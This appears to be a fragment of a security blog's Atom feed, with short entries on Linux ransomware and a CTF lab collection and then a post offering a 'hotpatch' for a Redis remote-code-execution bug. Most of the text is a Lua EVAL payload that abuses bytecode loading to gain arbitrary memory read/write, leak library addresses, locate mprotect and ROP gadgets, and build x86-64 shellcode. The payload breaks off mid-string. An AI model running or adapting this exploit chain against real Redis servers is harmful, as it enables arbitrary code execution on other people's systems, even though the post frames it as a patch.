    <category term="Disclosure"/>
    <category term="Exploit Development"/>
    <category term="Open Source Security"/>
    <summary type="html"><![CDATA[Let this be a reminder of the joys in programming PHP]]></summary>
  </entry>
  <entry>
    <title type="html">Ransomware hitting linux hosting providers</title>
    <link href="https://www.securesql.info/2016/02/19/linux-hosting-ransomware/" rel="alternate" type="text/html" title="Ransomware hitting linux hosting providers"/>
    <published>2016-02-19T00:00:00-08:00</published>
    <updated>2016-02-19T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2016/02/19/linux-hosting-ransomware</id>
    <content type="html" xml:base="https://www.securesql.info/2016/02/19/linux-hosting-ransomware/"><![CDATA[<p>It will be interesting to watch the infection spread on Google Trends
<a href="https://www.google.com/search?q=inurl:README_FOR_DECRYPT.txt+%22Without+this+key%22&amp;filter=0">https://www.google.com/search?q=inurl:README_FOR_DECRYPT.txt+%22Without+this+key%22&amp;filter=0</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Ransomware"/>
    <category term="Linux"/>
    <category term="Hosting Providers"/>
    <category term="Cybersecurity"/>
    <category term="Malware"/>
    <category term="Google Trends"/>
    <category term="Incident Monitoring"/>
    <category term="Threat Intelligence"/>
    <summary type="html"><![CDATA[It will be interesting to watch the infection spread on Google Trends]]></summary>
  </entry>
  <entry>
    <title type="html">DARPA Cyber Grand Challenge dropbox</title>
    <link href="https://www.securesql.info/2015/11/15/darpa-cyber-grand-challenge/" rel="alternate" type="text/html" title="DARPA Cyber Grand Challenge dropbox"/>
    <published>2015-11-15T00:00:00-08:00</published>
    <updated>2015-11-15T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2015/11/15/darpa-cyber-grand-challenge</id>
    <content type="html" xml:base="https://www.securesql.info/2015/11/15/darpa-cyber-grand-challenge/"><![CDATA[<p><img src="https://securesql.info/images/image-
asset.jpeg" alt="" /></p>

<p>With the coming IoT advent, the future requires architecturally different
thought paradigms to keep our information safe.  Especially with the pending
cryptoapocalypse.  I have been taking lessons learned from DARPA’s Cyber
Grand Challenge and applying it to our automation.  The challenge is having a
variety of complex systems to tune, correlate, improve, and decimate.  As a
result, I have started to collect a variety of CTF and various OSINT
penetration testing labs.   If you want to play with them, you may find the
repository @
https://www.dropbox.com/sh/13afkor966xpyr8/AADKZ7QNzaVBKVQmmpCE5GeZa?dl=0</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="DARPA"/>
    <category term="Cyber Grand Challenge"/>
    <category term="CTF"/>
    <category term="OSINT"/>
    <category term="Penetration Testing"/>
    <category term="Automation"/>
    <category term="IoT Security"/>
    <category term="Cryptoapocalypse"/>
    <category term="Security Research"/>
    <summary type="html"><![CDATA[I have been taking lessons learned from DARPA’s Cyber Grand Challenge and applying it to our automation]]></summary>
  </entry>
  <entry>
    <title type="html">Hotpatch Redis’s RCE</title>
    <link href="https://www.securesql.info/2015/08/16/redis-exploit-lua/" rel="alternate" type="text/html" title="Hotpatch Redis’s RCE"/>
    <published>2015-08-16T00:00:00-07:00</published>
    <updated>2015-08-16T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2015/08/16/redis-exploit-lua</id>
    <content type="html" xml:base="https://www.securesql.info/2015/08/16/redis-exploit-lua/"><![CDATA[<p>Do you feel lucky?  There is an interesting “patch” which will utilize the
recent Redis’s RCE vulnerability to patch Redis.  If you are feeling lucky,
one will want to run the below “javascript” code.</p>

<p>No warranties or assurances provided.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EVAL "local fail = function(msg)\n\n  print(\"[-] \" .. msg)\n  error(msg)\nend\n\nlocal addbyte = function(b8, byte)\n  local carry = byte\n  local result = ''\n  for i=1, string.len(b8) do\n    local cb = string.byte(b8, i) + carry\n    if cb &gt;= 256 then\n      carry = 1\n    else\n      carry = 0\n    end\n    result = result .. string.char(cb % 256)\n  end\n\n  return result\nend\n\nlocal double2string = function(x)\n  if x == nil then\n    return x\n  end\n  return struct.pack('&lt;d', x)\nend\n\n\nlocal asdouble = loadstring((string.dump(function(x)\n  for i = x, x, 0 do\n    return i\n  end\nend):gsub('\\96%z%z\\128', '\\22\\0\\0\\128')))\n\nlocal asstring = function(x) return double2string(asdouble(x)) end\n\nlocal cstring = function(v)\n  return addbyte(asstring(v), 24)\nend\n\n\n\n\nlocal string2double = function(x)\n  local r,n = struct.unpack('&lt;d', x)\n  return r\nend\n\nlocal subb8 = function(b8l, b8r)\n  local borrow = 0\n  local result = ''\n\n  for i=1, 8 do\n    local cb = string.byte(b8l, i) - borrow - string.byte(b8r, i)\n    if cb &lt; 0 then\n      borrow = 1\n      cb = cb + 256\n    else\n      borrow = 0\n    end\n    result = result .. string.char(cb)\n  end\n\n  return result\nend\n\nlocal tob8 = function(n)\n  local result = \"\"\n  for i =1, 8 do\n    local next_byte = n % 256\n    result = result .. string.char(next_byte)\n    n = math.floor(n / 256)\n  end\n  return result\nend\n\nlocal toint = function(b8)\n  local result = 0\n  for i =8,1,-1 do\n    result = result * 256\n    result = result + string.byte(b8, i)\n  end\n  return result\nend\n\n\nlocal addb8 = function(b8l, b8r)\n  local carry = 0\n  local result = ''\n  for i=1, 8 do\n    local cb = string.byte(b8l, i) + carry + string.byte(b8r, i)\n    if cb &gt;= 256 then\n      carry = 1\n    else\n      carry = 0\n    end\n    result = result .. string.char(cb % 256)\n  end\n\n  return result\nend\n\n\nlocal addint = function(b8, int)\n  return addb8(b8, tob8(int))\nend\n\nlocal subint = function(b8, int)\n  return subb8(b8, tob8(int))\nend\n\n\n\n\nlocal dump8 = function(b8)\n  if b8 == nil then\n    return \"&lt;nil&gt;\"\n  else\n    return string.format('%02x%02x%02x%02x%02x%02x%02x%02x', string.byte(b8, 8),string.byte(b8, 7),string.byte(b8, 6),string.byte(b8, 5),string.byte(b8, 4),string.byte(b8, 3),string.byte(b8, 2),string.byte(b8, 1))\n  end\nend\n\nlocal dump4 = function(b4)\n  return string.format('%02x%02x%02x%02x', string.byte(b4, 4),string.byte(b4, 3),string.byte(b4, 2),string.byte(b4, 1))\nend\n\n\n\n\n\nlocal word_read = nil\n\nlocal return_read_word = function(b8)\n  word_read = b8\nend\n\n\n\nlocal read_word = function(address)\n\n  local f = loadstring(string.dump(function()\n    local magic = nil\n    local function middle()\n      local upval\n      local cstring = cstring_global\n      local asstring = asstring_global\n      local b8 = word_to_read_global\n      local ret = return_global\n      local function inner()\n        upval = 'nextnext'..'t'..'m'..'papapa'..b8\n        local upval_ptr = cstring(upval)\n        magic = upval_ptr .. upval_ptr .. upval_ptr\n      end\n      inner()\n      ret(asstring(magic))\n    end\n    middle()\n  end):gsub('(\\100%z%z%z)....', '%1\\0\\0\\0\\1', 1))\n\n  local result = nil\n  local return_function = function(v)\n    result = v\n  end\n\n  local env = {cstring_global = cstring, asstring_global = asstring, word_to_read_global = address, return_read_word_global = return_read_word, return_global = return_function}\n\n  setfenv(f, env)\n  f()\n\n  return result\nend\n\n--[[ write word also corrupts the next 4 bytes after address :( const TValue *o2=(obj2); TValue *o1=(obj1); \\\n    o1-&gt;value = o2-&gt;value; o1-&gt;tt=o2-&gt;tt; ]]\nlocal write_word = function(address, value)\n  local f = loadstring(string.dump(function()\n    local magic = nil\n    local function middle()\n      local upval\n      local cstring = cstring_global\n      local string2double = string2double_global\n      local b8 = address_global\n      local value = value_to_write_global\n      local function inner()\n        upval = 'nextnext'..'t'..'m'..'papapa'..b8\n        local upval_ptr = cstring(upval)\n        magic = upval_ptr .. upval_ptr .. upval_ptr\n      end\n      inner()\n      magic = string2double(value)\n    end\n    middle()\n  end):gsub('(\\100%z%z%z)....', '%1\\0\\0\\0\\1', 1))\n\n  local env = {cstring_global = cstring, string2double_global = string2double, address_global = address, value_to_write_global = value}\n  setfenv(f, env)\n  f()\nend\n\nlocal new_lazy_stream = function(offset, size)\n  return {buffer = nil, buffer_offset = nil, start_offset = offset, current_offset = 0, size = size}\nend\n\nlocal lazy_stream_seek = function(stream, offset)\n  stream.current_offset = offset\nend\n\nlocal lazy_stream_skip = function(stream, offset)\n  stream.current_offset = stream.current_offset + offset\nend\n\nlocal lazy_stream_read = function(stream)\n  if stream.buffer == nil or stream.current_offset &lt; stream.buffer_offset or stream.current_offset &gt;= stream.buffer_offset + 8 then\n    --[[ dodgy floats ie repeated bytes of 0xFF will trigger multiple reads because the first word will fail then the next and so forth :( )]]\n    stream.buffer = read_word(addint(stream.start_offset, stream.current_offset))\n    stream.buffer_offset = stream.current_offset\n  end\n\n  local byte = nil\n  if stream.buffer ~= nil then\n    byte = string.byte(stream.buffer, stream.current_offset - stream.buffer_offset + 1)\n  end\n\n  stream.current_offset = stream.current_offset + 1\n  return byte\nend\n\n\nlocal lazy_stream_empty = function(stream)\n  return stream.current_offset &gt;= stream.size\nend\n\nlocal read_uleb8 = function(stream)\n  local value = 0\n  local shift = 1\n  while true do\n    local next_byte = lazy_stream_read(stream)\n    local masked = next_byte % 0x80\n\n\n    value = value + (masked * shift)\n\n    local high_bit = next_byte - masked\n\n    if high_bit == 0 then\n      return value\n    end\n    shift = shift * math.pow(2, 7)\n  end\nend\n\n\nlocal read_string = function(stream)\n  local value = {}\n  while true do\n    local next_byte = lazy_stream_read(stream)\n    if next_byte == 0 then\n      return table.concat(value, \"\")\n    end\n    table.insert(value, string.char(next_byte))\n  end\n\nend\n\n\nlocal ALTERNATION = 256\nlocal FINAL = 257\nlocal ANY = 258\n\nlocal function alternation(list)\n  if #list == 0 then\n    fail(\"assertion failed\")\n  end\n\n  if #list == 1 then\n    return list[1]\n  else\n\n    local current = {first_branch = list[1], second_branch = list[2], byte = ALTERNATION}\n    for i=3, #list do\n      current = {first_branch = current, second_branch = list[i], byte = ALTERNATION}\n    end\n\n    return current\n  end\nend\n\nlocal function dotstar()\n  local any = {byte = ANY}\n\n  local alternation = {first_branch = nil, second_branch = any, byte = ALTERNATION}\n  any.first_branch = alternation\n  return alternation\nend\n\nlocal function join(left, right)\n  left.first_branch = right\n  return left\nend\n\nlocal function literal(literal)\n  local current = {byte = FINAL, matched = literal}\n  for i=#literal,1,-1 do\n    current = {byte = string.byte(literal, i), first_branch = current}\n  end\n\n  return current\nend\n\nlocal function addstate(list, state, list_id)\n  if state.lastlist ~= list_id then\n    table.insert(list, state)\n    state.lastlist = list_id\n    if state.byte == ALTERNATION then\n      addstate(list, state.first_branch, list_id)\n      addstate(list, state.second_branch, list_id)\n    end\n  end\nend\n\n\nlocal function re_restart(match_state, re)\n  local current_list = {}\n  local list_id = match_state.list_id + 1\n  addstate(current_list, re, list_id)\n  return {list_id = list_id, current_list = current_list}\nend\n\n\nlocal function re_start(re)\n\n  return re_restart({list_id = 0}, re)\nend\n\n\n\nlocal function re_push_byte(match_state, byte)\n  local list_id = match_state.list_id + 1\n  local next_list = {}\n  local list_id = list_id + 1\n\n  for i=1,#match_state.current_list do\n    local state = match_state.current_list[i]\n    if (state.byte == byte or state.byte == ANY) then\n      addstate(next_list, state.first_branch, list_id)\n    end\n  end\n  return {list_id = list_id, current_list = next_list}\nend\n\n\n\n\nlocal pagealign = function(b8)\n  local byte2 = string.byte(b8, 2)\n  local aligned = math.floor(byte2 / 16) * 16\n  return string.char(0, aligned) .. string.sub(b8, 3)\nend\n\nlocal findmacho = function(b8)\n\n  local b8 = pagealign(b8)\n\n  local target = string.char(0xCF, 0xFA, 0xED, 0xFE)\n\n  local page_size = string.char(0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)\n\n  while true do\n    local word = read_word(b8)\n\n    if word ~= nil then\n      local top_half = string.sub(word, 1, 4)\n      if top_half == target then\n        return b8\n      end\n    end\n    b8 = subb8(b8, page_size)\n  end\n\nend\n\nlocal readi4 = function(b8)\n  local word = read_word(b8)\n  local top_half = string.sub(word, 1, 4)\n  return struct.unpack(\"&lt;I4\", top_half)\nend\n\n\nlocal c_length = function(s)\n  for i = 1, string.len(s) do\n    if string.byte(s, i) == 0 then\n      return i - 1\n    end\n  end\n\n  return string.len(s)\nend\n\nlocal terminate_c_string = function(s)\n  local length = c_length(s)\n  return string.sub(s, 1, length)\nend\n\n\nlocal parse_segment = function (b8, offset, segment_info)\n  local segment_name = terminate_c_string(read_word(addint(b8, offset + 8)) .. read_word(addint(b8, offset + 16)))\n  local vm_addr = read_word(addint(b8, offset + 24))\n  local vm_size = read_word(addint(b8, offset + 32))\n  local file_offset = read_word(addint(b8, offset + 40))\n\n  print(\"[*] found segment: \" .. segment_name .. \" =&gt; \" .. (dump8(vm_addr)) .. \"/\" .. dump8(file_offset))\n\n\n  segment_info[segment_name] = {vm_addr = vm_addr, file_offset = file_offset, vm_size = vm_size}\nend\n\n\nlocal parse_macho_segments = function(macho_offset, dyld_callback)\n  local commands = readi4(addbyte(macho_offset, 16))\n\n  local offset = 32\n\n  local segment_info = {}\n\n  for i=1,commands do\n    local command = readi4(addint(macho_offset, offset))\n    local size = readi4(addint(macho_offset, offset + 4))\n\n    if command == 25 then\n      parse_segment(macho_offset, offset, segment_info)\n    elseif command == 2147483682 then\n      dyld_callback(offset, segment_info)\n    end\n\n    offset = offset + size\n  end\n\n  return segment_info\nend\n\nlocal parse_libsystem_c_macho = function(macho_offset)\n\n  local callback = function(offset, segment_info)\n  end\n\n  local segment_info = parse_macho_segments(macho_offset, callback)\n\n  return segment_info\nend\n\nlocal segment_location = function(macho, segment_info, segment_name)\n\n  local text_segment = segment_info[\"__TEXT\"]\n  local target_segment = segment_info[segment_name]\n  local segment_location = addb8(subb8(target_segment.vm_addr, text_segment.vm_addr), macho)\n\n  return segment_location\nend\n\n\nlocal opcode_offset = function(macho, segment_info, lazy_binding_info_offset)\n\n  local link_edit_segment = segment_info[\"__LINKEDIT\"]\n  local text_segment = segment_info[\"__TEXT\"]\n\n\n  local offset_into_link_edit = subb8(tob8(lazy_binding_info_offset), link_edit_segment.file_offset)\n\n\n  local link_edit_location = segment_location(macho, segment_info, \"__LINKEDIT\")\n\n  return addb8(offset_into_link_edit, link_edit_location)\n\nend\n\nlocal matches_part = function(name, label, matched_so_far)\n\n  if string.len(label) &gt; string.len(name) - matched_so_far then\n    return false\n  end\n\n  for i = 1, #label do\n    if string.byte(label, i) ~= string.byte(name, i + matched_so_far) then\n      return false\n    end\n  end\n\n  return true\nend\n\n\n\nlocal find_exported_symbol = function(stream, name)\n\n  local matched_name = 0\n\n  local name_len = string.len(name)\n\n  while not lazy_stream_empty(stream) do\n\n    local terminal_size = read_uleb8(stream)\n\n\n    if (terminal_size &gt; 0 and name_len == matched_name) then\n      local flags = lazy_stream_read(stream)\n      local symbol_offset = read_uleb8(stream)\n      return symbol_offset\n    end\n\n    lazy_stream_skip(stream, terminal_size)\n\n    local children = lazy_stream_read(stream)\n\n\n    local matched = false\n    for i = 1, children do\n      local label = read_string(stream)\n      local node_offset = read_uleb8(stream)\n\n      if matches_part(name, label, matched_name) then\n        matched_name = matched_name + string.len(label)\n        lazy_stream_seek(stream, node_offset)\n        matched = true\n        break\n      end\n    end\n\n    if not matched then\n      return nil\n    end\n  end\n\nend\n\nlocal process_export_bindings = function(macho_offset, offset, size)\n\n\n  local mprotect = find_exported_symbol(new_lazy_stream(offset, size), \"_mprotect\")\n\n  if mprotect == nil then\n    fail(\"Failed to find mprotect\")\n  else\n    local mprotect_addr = addint(macho_offset, mprotect)\n\n    print(\"[+] found mprotect symbol \" .. dump8(mprotect_addr))\n    return mprotect_addr\n  end\n\nend\n\nlocal parse_exports_dyld_info = function(macho_offset, offset, segment_info)\n  local export_binding_info_offset = readi4(addint(macho_offset, offset + 40))\n  local export_binding_info_size = readi4(addint(macho_offset, offset + 44))\n\n  local offset = opcode_offset(macho_offset, segment_info,export_binding_info_offset)\n\n  return process_export_bindings(macho_offset, offset, export_binding_info_size)\nend\n\nlocal parse_libkernel_macho = function(macho_offset)\n\n  local mprotect_addr = nil\n  local callback = function(offset, segment_info)\n    mprotect_addr = parse_exports_dyld_info(macho_offset, offset, segment_info)\n  end\n\n  parse_macho_segments(macho_offset, callback)\n\n  return mprotect_addr\n\nend\n\nlocal process_lazy_bindings = function(offset, size)\n\n  local stream = new_lazy_stream(offset, size)\n\n  local current_symbol = {}\n  local symbols = {}\n  while not lazy_stream_empty(stream) do\n    local op = lazy_stream_read(stream)\n\n\n    local immediate = op % 16\n    local opcode = op - immediate\n\n    if opcode == 0x70 then\n      --[[BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB]]\n      current_symbol.segment = immediate\n      current_symbol.offset = read_uleb8(stream)\n\n    elseif opcode == 0x40 then\n      --[[BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM]]\n      current_symbol.name = read_string(stream)\n    elseif opcode == 0x10 then\n      --[[BIND_OPCODE_SET_DYLIB_ORDINAL_IMM]]\n      --[[ignore]]\n    elseif opcode == 0x90 then\n      --[[BIND_OPCODE_DO_BIND]]\n      print(\"[*] parsed_symbol \" .. current_symbol.name .. \" =&gt; \" .. current_symbol.segment .. \":\" .. current_symbol.offset)\n      table.insert(symbols, current_symbol)\n      local old_symbol = current_symbol\n      current_symbol = {}\n      current_symbol.segment = old_symbol.segment\n      current_symbol.offset = old_symbol.offset\n      current_symbol.name = old_symbol.name\n    elseif opcode == 0x00 then\n      --[[BIND_OPCODE_DONE]]\n      --[[ignore]]\n    else\n      fail(\"found unknown opcode in lazy bindings \" .. opcode)\n    end\n\n  end\n\n\n  return symbols\n\n\n\nend\n\nlocal parse_dyld_info = function(macho_offset, offset, segment_info)\n  local lazy_binding_info_offset = readi4(addint(macho_offset, offset + 32))\n  local lazy_binding_size =   readi4(addint(macho_offset, offset + 36))\n\n\n  local offset = opcode_offset(macho_offset, segment_info,lazy_binding_info_offset)\n\n  return process_lazy_bindings(offset, lazy_binding_size)\nend\n\nlocal find_symbol = function(symbols, symbol)\n\n  for i=1, #symbols do\n    if symbols[i].name == symbol then\n      return symbols[i]\n    end\n  end\n\n  return nil\nend\n\n\nlocal leak_macho = function(name, data_location, symbols, symbol)\n\n  local resolved_symbol = find_symbol(symbols, symbol)\n  if resolved_symbol == nil then\n    fail(\"Failed to find \" .. symbol .. \" symbol\")\n  end\n  print(\"[*] Found \" .. symbol .. \" symbol: \" .. resolved_symbol.offset)\n\n  --[[we assume the pointer is into the data segment. #TODO FIX THIS]]\n  local location = addint(data_location, resolved_symbol.offset)\n\n  local address = read_word(location)\n\n  print(\"[*] Found \" .. symbol .. \" location: \" .. dump8(address))\n\n  local macho_address = findmacho(address)\n\n  print('[*] found ' .. name .. ' macho base address: ' .. dump8(macho_address))\n\n  return macho_address\nend\n\n\nlocal parse_redis_macho = function(macho_offset)\n\n  local longjmp_location = nil\n  local libsystem_c = nil\n  local libkernel = nil\n\n  local callback = function(offset, segment_info)\n      local symbols = parse_dyld_info(macho_offset, offset, segment_info)\n\n      local data_location = segment_location(macho_offset, segment_info, \"__DATA\")\n\n\n      libsystem_c = leak_macho(\"libsystem_c\", data_location, symbols, \"_strlen\")\n      libkernel = leak_macho(\"libkernel\", data_location, symbols, \"_getrlimit\")\n\n      local longjmp = find_symbol(symbols, \"_longjmp\")\n\n      if longjmp == nil then\n        longjmp = find_symbol(symbols, \"__longjmp\")\n      end\n\n      if longjmp == nil then\n        fail(\"Failed to find _longjmp symbol\")\n      else\n        longjmp_location = read_word(addint(data_location, longjmp.offset))\n\n        print(\"[+] Found longjump jump location \" .. dump8(longjmp_location))\n      end\n\n\n\n  end\n\n  local segments = parse_macho_segments(macho_offset, callback)\n\n  return {redis = macho_offset, longjmp_address = longjmp_location, libsystem_c = libsystem_c, libkernel = libkernel, redis_segments = segments}\nend\n\n\nlocal matches = function(expected, word)\n\n  for i=1, #expected do\n    if string.byte(expected, i) ~= string.byte(word, i) then\n      return false\n    end\n  end\n\n  return true\nend\n\n\nlocal find_insn = function(name, expected, libc, offsets)\n\n  if #expected &gt;= 8 then\n    error(\"failed assertion\")\n  end\n\n  for i=1, #offsets do\n    local addr = addint(libc, offsets[i])\n    --[[apparently we can do unaligned reads :) :)]]\n    local word = read_word(addr)\n\n\n    if (word ~= nil) and matches(expected, word) then\n\n      return addr\n    end\n  end\n\n  return nil\n\n\nend\n\nlocal function find_rops(rops, stream)\n\n  local literals = {}\n  for i,rop in ipairs(rops) do\n    literals[i] = literal(rop)\n  end\n\n  local re = join(dotstar(), alternation(literals))\n  local state = re_start(re)\n  local found_rops = {}\n  local remaining = #rops\n\n  while not lazy_stream_empty(stream) and remaining &gt; 0 do\n    local next_byte = lazy_stream_read(stream)\n\n    if next_byte == nil then\n      state = re_restart(state, re)\n    else\n      state = re_push_byte(state, next_byte)\n    end\n\n    for i=1,#(state.current_list) do\n      local s = state.current_list[i]\n      if s.byte == FINAL then\n        if found_rops[s.matched] == nil then\n          remaining = remaining - 1\n          found_rops[s.matched] = stream.current_offset - string.len(s.matched)\n        end\n      end\n    end\n  end\n\n  return found_rops\nend\n\n-- offset search for named rops only works if rop_size &lt;= 8 bytes because it only reads\n-- a single word. slightly dodgy\nlocal function find_rops_and_assert(named_rops, stream, libc)\n  local missing_rops = {}\n\n  local inverted = {}\n\n  for rop, detail in pairs(named_rops) do\n    local addr = find_insn(detail.name, rop, libc, detail.offsets)\n    if addr == nil then\n      print(\"[-] Missing rop at fixed location will search: \" .. detail.name)\n      table.insert(missing_rops, rop)\n    else\n      print(\"[*] Found rop: \" .. detail.name .. \" @ \" .. dump8(addr))\n      inverted[detail.name] = addr\n    end\n  end\n\n  if #missing_rops &gt; 0 then\n    local found_rops = find_rops(missing_rops, stream)\n\n    for i=1,#missing_rops do\n      local rop = missing_rops[i]\n      if found_rops[rop] == nil then\n        fail(\"Failed to find rop: \" .. named_rops[rop].name)\n      else\n        local addr = addint(stream.start_offset, found_rops[rop])\n        local name = named_rops[rop].name\n        print(\"[*] Found rop: \" .. name .. \" @ \" .. dump8(addr))\n        inverted[name] = addr\n      end\n    end\n  end\n\n  return inverted\n\nend\n\nlocal copy_words = function(from, n)\n  local buf = {}\n  for i=1,n do\n    buf[i] = read_word(from)\n    from = addbyte(from, 8)\n  end\n\n  buf = table.concat(buf,\"\")\n\n  return buf\nend\n\n\nlocal check_system = function()\n-- os:Darwin 14.3.0 x86_64\n-- arch_bits:64\n\n  local info = redis.call(\"INFO\")\n\n  local os = string.match(info, \"os:([^\\r\\n]*)\")\n\n  if string.find(os, \"Darwin\") then\n    print(\"[*] Matches OSX =&gt; \" .. os)\n  else\n    fail(\"Not OSX =&gt; \" .. os)\n  end\n\n  local arch_bits = string.match(info, \"arch_bits:([^\\r\\n]*)\")\n\n  if arch_bits == \"64\" then\n    print(\"[*] 64 Bit\")\n  else\n    fail(\"Not 64 Bit =&gt; \" .. arch_bits)\n  end\nend\n\nlocal check_bytecode = function()\n\n  local f = loadstring(string.dump(function() end))\n\n  if f == nil then\n    fail(\"Loading byte code not supported\")\n  else\n    print(\"[*] Loading byte code supported\")\n  end\nend\n\n\nlocal find_fparser_cmp = function(program_information)\n  local redis_text_segment = program_information.redis_segments[\"__TEXT\"]\n  local stream = new_lazy_stream(program_information.redis, toint(redis_text_segment.vm_size))\n\n  local re = join(dotstar(), literal(string.char(0x41, 0x83, 0xff, 0x1b)))\n  local state = re_start(re)\n  local found = {}\n\n  local visited = {}\n\n  while not lazy_stream_empty(stream) do\n    local next_byte = lazy_stream_read(stream)\n\n\n    if next_byte == nil then\n      state = re_restart(state, re)\n    else\n      state = re_push_byte(state, next_byte)\n    end\n\n    for i=1,#(state.current_list) do\n      local s = state.current_list[i]\n      if s.byte == FINAL then\n\n        table.insert(found, stream.current_offset - string.len(s.matched))\n      end\n    end\n  end\n\n\n  if #found == 1 then\n    print(\"[*] found cmp   r15, 0x1b\")\n  else\n    fail(\"could not find unique cmp r15,0x1b \" .. #found)\n  end\n\n  local cmp_addr = addint(stream.start_offset, found[1])\n\n  print(\"[*] found cmp @ \" .. dump8(cmp_addr))\n\n  return cmp_addr\nend\n\n\ncheck_system()\n\ncheck_bytecode()\n\nlocal co = coroutine.wrap(function() end)\n\n\nlocal addr = read_word(addbyte(asstring(co), 32))\n\nlocal macho_address = findmacho(addr)\n\nprint('[*] found macho base address: ' .. dump8(macho_address))\n\n\n\nlocal program_information = parse_redis_macho(macho_address)\n\n\nlocal mprotect_addr  = parse_libkernel_macho(program_information.libkernel)\nlocal libc_segments = parse_libsystem_c_macho(program_information.libsystem_c)\n\nlocal longjmp_addr = program_information.longjmp_address\n\nlocal named_rops = {}\nnamed_rops[string.char(0x5E,0x5D,0xC3)] = {name = \"poprsipoprbp\", offsets = {0x1b83, 0x144b}}\nnamed_rops[string.char(0x5F,0x5D,0xC3)] = {name = \"poprdipoprbp\", offsets = {0x1d08, 0x15ee}}\nnamed_rops[string.char(0x5B, 0x41, 0x5E, 0x5D, 0xC3)] = {name = \"poprbxpopr14poprbp\", offsets = {0x1b81,0x1449}}\nnamed_rops[string.char(0x4C, 0x89, 0xF2, 0xFF, 0xD3)] = {name = \"movrdxr14callrbx\", offsets = {0x642f4,0x604f0}}\n\nlocal target_instruction = find_fparser_cmp(program_information)\n\nlocal libc_text_segment = libc_segments[\"__TEXT\"]\n\n-- we assume vm_addr == 0\n\nlocal libc_text_stream = new_lazy_stream(program_information.libsystem_c, toint(libc_text_segment.vm_size))\n\nlocal rop_addresses = find_rops_and_assert(named_rops, libc_text_stream, program_information.libsystem_c)\n\nlocal poprbp = addint(rop_addresses.poprsipoprbp, 1)\n\n\nlocal dummy = '\\1\\1\\1\\1\\1\\1\\1\\1'\nlocal null = '\\0\\0\\0\\0\\0\\0\\0\\0'\n\n\n\nlocal shellcode = nil\n\nlocal payload_str = nil\n\nlocal old_jump_buf = nil\n\ncollectgarbage()\n\nco = coroutine.create(function ()\n  local stack_pointer = read_word(addbyte(asstring(co), 8 * 21))\n  print(\"[*] leaked stack pointer: \" .. dump8(stack_pointer))\n\n  local jmp_buf_eip = addint(stack_pointer, 64)\n  local jmp_buf_sp = addint(stack_pointer, 24)\n\n  local existing_eip = read_word(jmp_buf_eip)\n\n  print(\"[*] old jump_buf eip \" .. dump8(existing_eip))\n\n  local existing_sp = read_word(jmp_buf_sp)\n\n  print(\"[*] existing sp \" .. dump8(existing_sp))\n\n\n\n  old_jump_buf = copy_words(stack_pointer, 48)\n\n\n  local old_jump_buf_addr = addint(cstring(old_jump_buf), 8)\n\n  shellcode =\n    -- 48 bf VALUE    movabs    rdi,VALUE\n    string.char(0x48,0xbf) .. pagealign(target_instruction) ..\n    -- 48 c7 c6 00 20 00 00    mov    rsi,0x2000\n    string.char(0x48, 0xc7, 0xc6, 0x00, 0x20, 0x00, 0x00) ..\n    -- 48 c7 c2 07 00 00 00    mov    rdx,0x7\n    string.char(0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00) ..\n\n    -- 48 b8 VALUE movabs rax, VALUE\n    string.char(0x48, 0xb8) .. mprotect_addr ..\n\n    -- ff d0                   call   rax\n\n    string.char(0xff, 0xd0) ..\n\n    -- 48 bf VALUE    movabs    rdi,VALUE\n    string.char(0x48,0xbf) .. target_instruction ..\n\n    -- c7 07 VALUE       mov    DWORD PTR [rdi],VALUE\n\n    string.char(0xc7, 0x07) .. string.char(0x48, 0x83, 0xfc, 0x1b) ..\n\n    -- restore permissions\n\n    -- 48 bf VALUE    movabs    rdi,VALUE\n    string.char(0x48,0xbf) .. pagealign(target_instruction) ..\n    -- 48 c7 c6 00 20 00 00    mov    rsi,0x2000\n    string.char(0x48, 0xc7, 0xc6, 0x00, 0x20, 0x00, 0x00) ..\n    -- 48 c7 c2 05 00 00 00    mov    rdx,0x5\n    string.char(0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00) ..\n\n    -- ret\n    string.char(0xc3)\n\n  local shellcode_ptr = cstring(shellcode)\n\n  print(\"[*] shellcode_ptr \" .. dump8(shellcode_ptr))\n\n  local rdi = pagealign(shellcode_ptr)\n  local rsi = tob8(8192)\n  local rdx_all = tob8(7) -- PROT_READ | PROT_WRITE | PROT_EXEC\n  local rdx_read_write = tob8(3) -- PROT_READ | PROT_WRITE\n\n  local payload = {\n          --[[ padding for our fake stack. `system` calls into the dynamic linker because of stubbed crap. so stack can get quite big. 1024 bytes =&gt; stack overflow and corruption of lua/redis heap ]]\n          \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n          